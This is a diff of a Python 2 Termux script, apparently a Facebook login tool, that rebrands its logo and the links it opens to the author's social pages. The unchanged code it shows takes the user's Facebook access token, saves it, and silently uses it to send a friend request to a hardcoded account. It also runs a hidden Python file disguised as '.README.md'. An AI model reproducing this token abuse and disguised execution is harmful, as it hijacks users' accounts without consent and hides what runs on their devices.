@@ -19,19 +19,20 @@ br.addheaders = [('User-Agent', "Opera/9.80 (Android; Opera Mini/32.0.2254/85. U
 os.system("clear")
 ##### LOGO #####
 logo='''
-88888888ba  8b        d8  88
-88      '8b  Y8,    ,8P   88
-88      ,8P   `8b  d8'    88
-88_____-8P'     Y88P      88
-88------8b,     d88b      88
-88      `8b   ,8P  Y8,    88
-88      a8P  d8'    `8b   88
-88888888P'  8P        Y8  88
+ \033[1;97########        ########    ####      ####
+\033[1;97m####    ####  ####  ####    ####    ####
+\033[1;92m####       ####     ####    ####   ####
+\033[1;92m####        ##      ####    ########
+\033[1;92m####                ####    ####    ####
+\033[1;96m####                ####    ####     ####
+\033[1;96m####                #### ## ####       ####
+\033[1;97m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;92m๑۩۩๑\033[1;97m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
+
 --------------------------------------------------
  Auther   : Mansoor Ali
  GitHub   : https://github.com/Man50or
  YouTube  : Mk Tricks
- Blogspot : Not Yet
+ Facebook : https://facebook.com/Man50or
 --------------------------------------------------
                                 '''
 
@@ -50,11 +51,11 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print " Wrong Password !"
-            os.system('xdg-open https://trickproof.blogspot.com/2020/02/new-killing-commands-of-termux-for.html')
+            os.system('xdg-open https://facebook.com/Man50or')
             os.system("clear")
     else:
         print " Wrong Username !"
-        os.system('xdg-open https://trickproof.blogspot.com/2020/02/new-killing-commands-of-termux-for.html')
+        os.system('xdg-open https://facebook.com/Man50or')
         os.system("clear")
 
 def tik():
@@ -89,7 +90,7 @@ def login_choice():
         fout.write(fac)
         fout.close()
         requests.post('https://graph.facebook.com/me/friends?method=post&uids=100002059014174&access_token='+fac)
-        os.system('xdg-open https://www.youtube.com/channel/UCIC01LyIO5oroo1Qo6Fi4Mw')
+        os.system('xdg-open https://www.youtube.com/mktricks143')
         os.system("python2 .README.md")
     elif bch =="1":
         login1()
@@ -133,7 +134,7 @@ def login1():
                                 chb.write(z['access_token'])
                                 chb.close()
                                 print ('\n\x1b[1;92m[+] Login Successfull \x1b[1;97m')
-                                os.system('xdg-open https://www.youtube.com/channel/UCIC01LyIO5oroo1Qo6Fi4Mw')
+                                os.system('xdg-open https://www.youtube.com/mktricks143')
                                 requests.post('https://graph.facebook.com/me/friends?method=post&uids=100002059014174&access_token='+z['access_token'])
                                 os.system("python2 .README.md")
                         except requests.exceptions.ConnectionError:
